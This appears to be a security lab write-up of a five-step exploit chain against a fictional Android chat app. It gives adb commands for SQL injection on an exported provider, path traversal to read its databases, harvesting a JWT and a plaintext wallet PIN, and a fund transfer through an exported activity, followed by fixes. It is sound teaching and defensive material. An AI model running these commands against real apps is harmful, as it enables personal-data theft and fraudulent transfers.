# Chain 02 — Chat PII Exfiltration Chain

## Overview

| Field | Value |
|-------|-------|
| **Category** | provider + storage |
| **Difficulty** | HARD |
| **Steps** | 5 |
| **Components crossed** | ContactsProvider → FileBackupProvider → AccountActivity |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | SQLi dump → path traversal → secret harvest → exported activity → fund movement |

## Vulnerable surface

- `ContactsProvider` (authority `com.mochat.app.contacts`) — exported, raw `selection` → SQLi
- `FileBackupProvider` (authority `com.mochat.app.backup`) — exported, no canonical-path check → traversal reads `databases/*.db`
- `chat.db` `messages` table — JWT embedded in plaintext `body` field
- `wallet.db` `keys` table — `MASTER_PIN` stored in cleartext
- `AccountActivity` (exported) — accepts extras and runs transfer flow under app identity

## Step-by-step exploit

### ① SQLi ContactsProvider dumps all contacts

```bash
# Classic tautology: selection is concatenated into rawQuery.
adb shell content query --uri content://com.mochat.app.contacts/contacts \
  --where "' OR 1=1 --"
```

Returns every row, exposing `id_card` and `phone` for all users.

### ② Path-traversal FileBackupProvider reads chat.db

```bash
# ..%2F decodes to ../, escaping the backup root into databases/.
adb shell content read --uri "content://com.mochat.app.backup/..%2Fdatabases%2Fchat.db" > chat.db
sqlite3 chat.db "SELECT body FROM messages WHERE body LIKE '%eyJ%' LIMIT 5;"
```

### ③ Extract JWT from messages table body field

```bash
# JWTs start with eyJ (base64 '{"'). Pull the token out of the chat body column.
sqlite3 chat.db "SELECT substr(body, instr(body,'eyJ')) FROM messages WHERE body LIKE '%eyJ%' LIMIT 1;"
# -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>
```

Decode the payload to recover `user_id` and `role`.

### ④ Read plaintext MASTER_PIN via FileBackupProvider → wallet.db

```bash
adb shell content read --uri "content://com.mochat.app.backup/..%2Fdatabases%2Fwallet.db" > wallet.db
sqlite3 wallet.db "SELECT k, v FROM keys WHERE k='MASTER_PIN';"
# -> MASTER_PIN = 137846
```

### ⑤ Launch exported AccountActivity to confirm balance, use PIN for transfer

```bash
# Exported activity, no permission guard. Extras drive the transfer directly.
adb shell am start -n com.mochat.app/.wallet.AccountActivity \
  --es action "transfer" \
  --es to "attacker_acc_001" \
  --es pin "137846" \
  --el amount 500000
```

**logcat confirms**:

```
AccountActivity: balance=8123400 pin=ok to=attacker_acc_001 amount=500000 txn=TXN-2C9F...
```

## Guard analysis

| Guard | Status |
|-------|--------|
| ContactsProvider read permission | absent (exported, no permission) |
| ContactsProvider selection binding | absent (raw concatenation → SQLi) |
| FileBackupProvider path filter | absent (no canonical-path check) |
| chat.db message body encryption | absent (JWT in cleartext) |
| wallet.db MASTER_PIN hashing | absent (plaintext) |
| AccountActivity caller check | absent (exported, trusted-only logic) |

## Impact

Attacker exfiltrates the full contact roster (national IDs, phone numbers), steals the active
session JWT from chat history, recovers the wallet MASTER_PIN in cleartext, and triggers a
transfer under the app's identity. Full PII breach plus fund movement with no credentials known
ahead of time.

## Fix

- Parameterize `queryContacts`; never pass the caller's `selection` into `rawQuery`.
- `FileBackupProvider.openFile` must canonicalize the path and reject anything outside the
  backup root (`File.getCanonicalFile().startsWith(root)`).
- Never log or persist JWTs in the messages table; scrub `body` before storage.
- Store `MASTER_PIN` as a salted hash (e.g. Argon2id), never plaintext.
- Make `AccountActivity` non-exported, or gate the transfer action behind a re-auth + caller
  signature check.
